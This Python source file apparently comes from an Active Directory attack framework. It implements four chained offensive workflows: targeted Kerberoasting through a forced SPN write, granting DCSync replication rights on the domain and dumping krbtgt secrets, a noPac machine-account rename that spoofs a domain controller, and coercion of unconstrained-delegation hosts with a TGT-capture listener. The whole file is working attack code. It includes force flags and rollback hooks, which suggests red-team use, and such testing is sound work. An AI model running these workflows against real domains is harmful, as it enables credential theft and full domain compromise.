"""Joined offensive workflows built from supported primitive runners."""

from __future__ import annotations

from typing import Any

from ldap3 import MODIFY_REPLACE
from rich.console import Console

from adaf_attack.capabilities.acl_primitives import WriteSpn
from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.capabilities.coerce import Coerce
from adaf_attack.capabilities.dcsync import Dcsync
from adaf_attack.capabilities.delegation_ops import UnconstrainedDelegation
from adaf_attack.capabilities.kerberoast import Kerberoast
from adaf_attack.capabilities.maq_ops import MaqAddComputer
from adaf_attack.core.acl import (
    GUID_DS_REPLICATION_GET_CHANGES,
    GUID_DS_REPLICATION_GET_CHANGES_ALL,
    append_ace_to_sd,
    build_allowed_ace,
    fetch_sd,
)
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import (
    attr_strings,
    attr_value,
    finish,
    lookup_sam,
    register_advisory_rollback,
    register_attr_rollback,
    require_force,
    require_param,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.rbcd_sd import sid_from_ldap_value
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target
from adaf_attack.core.tgt_capture import TgtCaptureListener

console = Console()


@register_from_catalog("targeted-kerberoast")
class TargetedKerberoast:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("targeted-kerberoast", force)
        sam = require_param(kwargs, "sam", "write_target")
        spn = str(kwargs.get("spn") or f"ADAFTKR/{sam.rstrip('$')}")
        write = WriteSpn().run(target, session, graph, force=True, sam=sam, spn=spn)
        roast = {"skipped": "spn_write_failed"}
        revert: dict[str, Any] = {"skipped": True}
        if write.get("ok"):
            roast = Kerberoast().run(
                target, session, graph, include_secrets=include_secrets, force=force
            )
            revert = WriteSpn().run(
                target,
                session,
                graph,
                force=True,
                sam=sam,
                clear=True,
            )
            if write.get("previous"):
                WriteSpn().run(
                    target,
                    session,
                    graph,
                    force=True,
                    sam=sam,
                    spns=write["previous"],
                    replace=True,
                )
        result = {
            "ok": bool(write.get("ok")),
            "write": write,
            "roast": roast,
            "revert": revert,
        }
        return finish(session, graph, "targeted-kerberoast", result, ok=result["ok"])


@register_from_catalog("dcsync-grant-workflow")
class DcsyncGrantWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("dcsync-grant-workflow", force)
        grant: dict[str, Any] = {"ok": False}
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            sid = kwargs.get("principal_sid") or kwargs.get("sid")
            if not sid:
                if not target.username:
                    raise RuntimeError(
                        "dcsync-grant-workflow requires -P principal_sid or --username"
                    )
                found = lookup_sam(conn, base_dn, target.username, ["objectSid"])
                if not found:
                    raise RuntimeError(f"Unable to resolve {target.username}")
                sid = sid_from_ldap_value(attr_value(found[1], "objectSid"))
            if not sid:
                raise RuntimeError("Unable to parse principal SID")
            previous = fetch_sd(conn, base_dn)
            sd = append_ace_to_sd(
                previous,
                build_allowed_ace(
                    str(sid), mask=0x00000100, object_guid=GUID_DS_REPLICATION_GET_CHANGES
                ),
            )
            sd = append_ace_to_sd(
                sd,
                build_allowed_ace(
                    str(sid), mask=0x00000100, object_guid=GUID_DS_REPLICATION_GET_CHANGES_ALL
                ),
            )
            ok = bool(conn.modify(base_dn, {"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd])]}))
            if ok:
                session.register_cleanup(
                    {
                        "kind": "acl",
                        "target": base_dn,
                        "previous_hex": (previous or b"").hex(),
                        "rollback": "Restore original domain nTSecurityDescriptor.",
                    }
                )
            grant = {"ok": ok, "dn": base_dn, "principal_sid": sid, "ldap_result": str(conn.result)}
        finally:
            conn.unbind()
        dumped: dict[str, Any] = {"skipped": "grant_failed"}
        if grant.get("ok"):
            dumped = Dcsync().run(
                target,
                session,
                graph,
                include_secrets=include_secrets,
                force=True,
                sam=kwargs.get("dcsync_sam") or kwargs.get("just_user") or "krbtgt",
            )
        result = {"ok": bool(grant.get("ok")), "grant": grant, "dcsync": dumped}
        return finish(session, graph, "dcsync-grant-workflow", result, ok=result["ok"])


@register_from_catalog("nopac-workflow")
class NopacWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("nopac-workflow", force)
        dc_sam = require_param(kwargs, "dc", "dc_sam")
        created = MaqAddComputer().run(
            target,
            session,
            graph,
            force=True,
            include_secrets=include_secrets,
            computer=kwargs.get("name"),
            password=kwargs.get("password"),
        )
        rename: dict[str, Any] = {"skipped": "computer_create_failed"}
        restore: dict[str, Any] = {"skipped": True}
        if created.get("ok"):
            conn, base_dn, _cfg = ldap_connect(target)
            try:
                found = lookup_sam(
                    conn, base_dn, created["sam"], ["distinguishedName", "sAMAccountName"]
                )
                dc_found = lookup_sam(conn, base_dn, dc_sam, ["sAMAccountName"])
                if not found or not dc_found:
                    raise RuntimeError("noPac rename lookup failed")
                dn, entry = found
                previous = attr_strings(entry, "sAMAccountName")
                spoof = str(attr_strings(dc_found[1], "sAMAccountName")[0]).rstrip("$")
                ok = bool(conn.modify(dn, {"sAMAccountName": [(MODIFY_REPLACE, [spoof])]}))
                if ok:
                    register_attr_rollback(
                        session,
                        target_dn=dn,
                        attribute="sAMAccountName",
                        previous=previous,
                        rollback="Restore the machine sAMAccountName after noPac.",
                    )
                rename = {
                    "ok": ok,
                    "spoof": spoof,
                    "previous": previous,
                    "ldap_result": str(conn.result),
                }
                if ok:
                    restore_ok = bool(
                        conn.modify(
                            dn, {"sAMAccountName": [(MODIFY_REPLACE, previous or [created["sam"]])]}
                        )
                    )
                    restore = {"ok": restore_ok, "ldap_result": str(conn.result)}
            finally:
                conn.unbind()
        result = {
            "ok": bool(created.get("ok") and rename.get("ok")),
            "computer": created,
            "rename": rename,
            "restore": restore,
        }
        return finish(session, graph, "nopac-workflow", result, ok=result["ok"])


@register_from_catalog("unconst-tgtdump-workflow")
class UnconstTgtDumpWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("unconst-tgtdump-workflow", force)
        hunt = UnconstrainedDelegation().run(target, session, graph)
        hosts = [
            p.get("dns") or p.get("sam")
            for p in hunt.get("principals") or []
            if p.get("unconstrained")
        ]
        chosen = kwargs.get("host") or kwargs.get("allow_hosts") or (hosts[0] if hosts else None)
        capture_enabled = bool(kwargs.get("capture"))
        capture_listener: TgtCaptureListener | None = None
        coerce_listener = kwargs.get("listener") or target.dc_ip
        capture_doc: dict[str, Any] | None = None
        if capture_enabled and chosen:
            capture_listener = TgtCaptureListener(
                session.path("captured"),
                host=str(kwargs.get("capture_host") or "0.0.0.0"),
                port=int(kwargs.get("capture_port") or 4450),
                timeout=float(kwargs.get("capture_timeout") or 15.0),
                max_captures=int(kwargs.get("capture_count") or 1),
            )
            if capture_listener.start():
                coerce_listener = f"{capture_listener.endpoint}:{capture_listener.port}"
            else:
                capture_doc = capture_listener.summary()
                capture_listener = None
        coerce_result: dict[str, Any] = {"skipped": "no_unconstrained_host"}
        if chosen:
            coerce_result = Coerce().run(
                target,
                session,
                graph,
                force=True,
                listener=coerce_listener,
                host=chosen,
                allow_hosts=chosen,
            )
        if capture_listener is not None:
            try:
                capture_listener.wait()
            finally:
                capture_listener.stop()
            capture_doc = capture_listener.summary()
        register_advisory_rollback(
            session,
            kind="coercion",
            target=str(chosen or "none"),
            rollback="Coercion does not persist directory state; drop captured TGTs from the listener.",
        )
        result = {"ok": bool(hunt.get("count")), "hunt": hunt, "coerce": coerce_result}
        if capture_enabled and capture_doc is None:
            result["capture"] = {"performed": True, "count": 0}
        elif capture_doc is not None:
            result["capture"] = capture_doc
        return finish(session, graph, "unconst-tgtdump-workflow", result, ok=result["ok"])
